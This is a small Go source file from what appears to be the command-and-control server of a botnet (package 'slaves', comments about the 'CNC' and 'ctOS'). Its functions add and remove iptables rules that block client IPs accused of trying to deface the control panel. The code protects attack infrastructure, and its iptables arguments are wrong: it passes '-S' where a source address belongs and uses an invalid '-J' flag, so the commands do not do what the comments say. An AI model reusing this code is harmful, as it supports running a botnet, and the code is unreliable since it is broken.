package slaves

import (
	"os/exec"
)

var (
	//IPBanDefaceAttempts will use iptables to block a IP if they attempt to deface the CNC
	IPBanDefaceAttempts = false

)

//IPBan will block the IP via IPtables
func (c *Client) IPBan() error {


	cmd := exec.Command("iptables", "-I", "-S", c.IP(), "-J", "DROP", "-m", "comment", "--comment", "ctOS blocked for deface attempt")
	return cmd.Run()
}

//UnIPBan will unblock the IP via IPtables
func (c *Client) UnIPBan() error {

	cmd := exec.Command("iptables", "-D", "-S", c.IP(), "-J", "DROP")
	return cmd.Run()
}
